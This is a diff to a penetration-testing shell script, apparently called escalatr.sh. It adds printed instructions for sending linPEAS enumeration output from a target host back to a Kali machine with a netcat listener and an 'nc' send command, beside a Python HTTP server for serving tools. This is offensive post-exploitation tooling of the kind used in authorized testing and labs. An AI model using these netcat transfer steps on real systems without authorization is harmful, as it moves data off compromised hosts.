@@ -339,6 +339,19 @@ serve_tools() {
         echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
     fi
 
+    echo ""
+    success "Transfer output back to Kali:"
+    echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
+    echo -e "  ${CYAN}# Kali (run first):${NC}"
+    echo -e "  nc -lvnp 9001 > linpeas_output.txt"
+    echo -e "  ${CYAN}# Target:${NC}"
+    echo -e "  nc ${kali_ip} 9001 < ${REMOTE_TMP}/linpeas_output.txt"
+    echo ""
+    echo -e "  ${CYAN}# Then parse on Kali:${NC}"
+    echo -e "  ./escalatr.sh --parse linpeas_output.txt --os linux"
+    echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
+    echo ""
+
     # Start server in background (subshell avoids changing working directory)
     (cd "$tools_dir" && exec python3 -m http.server "$HTTP_PORT") &>/dev/null &
     HTTP_SERVER_PID=$!
